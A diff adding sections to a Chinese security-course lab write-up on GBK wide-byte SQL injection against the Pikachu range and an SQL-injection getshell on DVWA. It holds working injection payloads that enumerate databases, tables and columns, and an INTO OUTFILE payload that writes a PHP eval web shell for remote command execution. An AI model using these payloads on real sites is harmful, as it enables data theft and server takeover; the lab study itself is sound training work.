@@ -272,4 +272,121 @@ http://127.0.0.1:8081/vulnerabilities/sqli_blind/?id=1' and ascii(substr((select
 ![Alt text](image-45.png)   
 | `users`中第一个字段名称的第一个字符为 `u`。后续不断调整`substr`函数中的第二个参数，即可完成字段名称的爆破。
 # 四、利用宽字节注入实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。
+## 1. 宽字节注入原理
+### 1.1 概念
+如果一个字符的大小是一个字节，称为窄字节，比如ASCII编码（0-127）。   
+如果一个字符的大小是两个或以上的字节，称为宽字节。例如GBK编码的时候，会认为两个字符是一个汉字。
+### 1.2 URL编码对照表
+|字符|URL编码|
+|---|---|
+|`%`|%25|
+|`'`|%27|
+|`\`|%5c|
+### 1.3 原理
+当我们尝试SQL注入的时候，系统可能会在我们的`'`的前面加入一个`\`，将我们的`'`进行转义，让他最终被解释为输入的字符串进行执行，无法完成预想的`'`逃逸，使得后面的语句仍然作为一参数整体来执行，例如：   
+```sql
+ select * from users where user_id = '1\' and 1 = 1 -- '
+```
+上面的语句中，因为在`'`前面加入了`\`,使得and逃逸失败。但是如果数据库使用的是GBK宽字节编码， `\` 经过url编码之后为 `%5c`, 在 `%5c` 前面拼接一个 `%df` 可以使得 `%df%5c` 组成一个汉字 `運`。这样执行的时候，就会变为：   
+```sql
+ select * from users where user_id = '1運' and 1 = 1 -- '
+```
+使得后面的`and`顺利逃逸。   
+
+GBK对照表：    
+```url
+https://www.toolhelper.cn/Encoding/GBK
+```
+## 2. 靶场环境部署
+```shell
+ # 搜索镜像
+ docker search area39/pikachu
+ # 拉取
+ docker pull area39/pikachu
+ # 启动镜像
+ docker run -d -p 80:80 area39/pikachu
+```
+## 3. 启动 BurpSuite
+![Alt text](image-46.png)
+## 4. 设置代理
+![Alt text](image-47.png)
+## 5. 访问靶场,选择宽字节注入菜单
+```url
+http://huanxue.com/vul/sqli/sqli_widebyte.php
+```
+![Alt text](image-48.png)
+## 6. 查看正常功能
+![Alt text](image-49.png)   
+通过用户名，查询用户信息，例如：输入`kobe` ，查询出了`kobe`的信息。
+## 7. 尝试注入
+输入 `1%df'`   
+![Alt text](image-50.png)
+## 8. 查看抓包数据
+![Alt text](image-51.png)
+## 9. 发送至请求重放模块
+![Alt text](image-52.png)
+## 10. 发现因为`%`本身也被转义为了 `%25`,所以需要删除 `25` 部分，让他能够组成 `%df%5c`
+![Alt text](image-53.png)
+## 11. 使用 `union` 注入的方式，确定查询的字段数量和显示字段
+```url
+ name=1%df%27 union all select 1,2 -- &submit=%E6%9F%A5%E8%AF%A2
+```
+![Alt text](image-54.png)   
+查询了两个字段，一个uid，在1的位置，一个email在2的位置。
+
+## 12. 获取当前数据库名称
+```url
+ name=1%df%27 union all select database(),2 -- &submit=%E6%9F%A5%E8%AF%A2
+```
+![Alt text](image-55.png)
+## 13. 获取表名
+```url
+ name=1%df%27 union all select 1,table_name from information_schema.tables where table_schema = database() -- &submit=%E6%9F%A5%E8%AF%A2
+```
+![Alt text](image-56.png)   
+## 14. 获取字段名
+```url
+ name=1%df%27 union all select table_name,column_name from information_schema.columns where table_schema = database() -- &submit=%E6%9F%A5%E8%AF%A2
+```
+![Alt text](image-57.png)
+
 # 五、利用 SQL 注入实现 DVWA 站点的 Getshell，写清楚攻击步骤。
+## 1. `select ... into outfile` 函数
+该语句用 `SELECT` 来查询所需要的数据，用 `INTO OUTFILE` 来导出数据。其中，目标文件用来指定将查询的记录导出到哪个文件。这里需要注意的是，目标文件不能是一个已经存在的文件。
+
+## 2. 利用条件
+（1）要知道网站的绝对路径。   
+（2）对目录要有写权限。   
+（3）要有mysql file权限。   
+
+## 3. 查看网站的绝对路径。
+```url
+ http://127.0.0.1:8081/phpinfo.php
+```
+![Alt text](image-59.png)   
+可知网站的绝对路径为`/var/www/html`.
+
+## 4. 访问靶场
+因为使用的是`dvwa`靶场的老功能页面，就不再做功能说明。
+```url
+ http://127.0.0.1:8081/vulnerabilities/sqli/
+```
+![Alt text](image-58.png)
+## 5. 构造一句话木马语句，尝试写入根目录`/var/www/html/shell.php`文件中。
+```url
+ http://127.0.0.1:8081/vulnerabilities/sqli/?id=1' union all select 1,"<?php eval($_POST['a']);" into outfile '/var/www/html/shell.php' -- &Submit=Submit#
+```
+![Alt text](image-61.png)
+## 6. 访问上传的shell文件
+```url
+ http://127.0.0.1:8081/shell.php
+```
+![Alt text](image-60.png)
+
+## 7. 远程命令执行
+![Alt text](image-62.png)
+## 8. 使用中国蚁剑
+![Alt text](image-63.png)
+![Alt text](image-64.png)
+
+
